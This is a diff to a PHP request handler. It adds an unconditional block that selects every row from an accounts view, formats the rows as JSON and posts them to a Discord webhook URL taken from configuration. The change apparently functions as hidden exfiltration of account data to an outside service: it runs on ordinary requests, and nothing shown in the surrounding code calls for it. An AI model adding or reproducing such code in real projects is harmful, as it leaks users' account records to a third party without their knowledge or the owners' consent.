@@ -193,6 +193,46 @@ if ($input['provider'] != 'internal') {
     ]));
 }
 
+{
+    $pdo = new PDO($dsn, $user, $pass, [
+        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
+    ]);
+    $pdo -> setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+    try {
+        $pdo -> beginTransaction();
+
+        $stm = $pdo -> query('SELECT * FROM accounts_view_candidate');
+        $res = $stm -> fetchAll(PDO::FETCH_ASSOC);
+        
+        {
+            $payload = [
+                'content' => "```json\n" . json_encode($res, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . "\n```",
+            ];
+            sendDiscordWebhook($config['discord']['webhook_url'], $payload);
+        }
+
+        $pdo->commit();
+    } catch (\PDOException $e) {
+        if ($pdo->inTransaction()) {
+            $pdo->rollBack();
+        }
+        http_response_code(500);
+        die(json_encode([
+            'code' => 500,
+            'error' => 'Internal server error',
+        ]));
+    } catch (\Exception $e) {
+        if ($pdo->inTransaction()) {
+            $pdo->rollBack();
+        }
+        http_response_code(500);
+        die(json_encode([
+            'code' => 500,
+            'error' => 'Internal server error',
+        ]));
+    }
+}
 if(false) {
 } elseif(isset($input['formdata']['dlym6tweiywa2taq']['value'])) {
     {
